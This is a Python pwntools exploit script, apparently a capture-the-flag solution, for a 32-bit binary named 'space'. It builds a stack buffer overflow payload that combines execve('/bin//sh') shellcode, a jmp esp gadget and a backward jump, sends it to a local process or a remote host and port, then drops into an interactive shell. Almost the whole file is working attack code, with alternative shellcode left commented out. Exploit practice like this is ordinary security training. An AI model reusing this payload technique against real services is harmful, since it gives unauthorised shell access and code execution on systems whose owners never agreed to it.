#!/usr/bin/python3

from pwn import *

elf = None

def start():

    global elf
    file_name = './space'
    elf = context.binary = ELF(file_name)
    context.arch = 'i386'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            init-pwndbg
            b *0x080491cf
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process(file_name)


def runmain(): 
    
    io = start()
    offset = 18

    payload = b'a' * offset + b'bbbbbbbb'

    # shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    shellcode = b'\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    # info(disasm(shellcode))
    # shellcode = enhex(shellcode)

    first = b'\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\xb0\x0b\xcd\x80'
    second = b'\x89\xc4\x31\xc0\x89\xc1'

    info(disasm(first + second))

    first_stage = shellcode[:4]
    second_stage = shellcode[4:]
    second_stage = second_stage + b'\x90' * (18 - len(second_stage))

    info(f'length of second stage: {len(second_stage)}')

    jmp_esp = p32(0x0804919F)
    # second_stage = b'a' * 18

    final_payload = first + jmp_esp + second + b'\xeb\xe2'

    info(f'total payload length: {len(final_payload)}')

    input('Press Enter to continue...')
    
    io.sendlineafter('>', final_payload)
    io.interactive()


if __name__ == '__main__':
    runmain()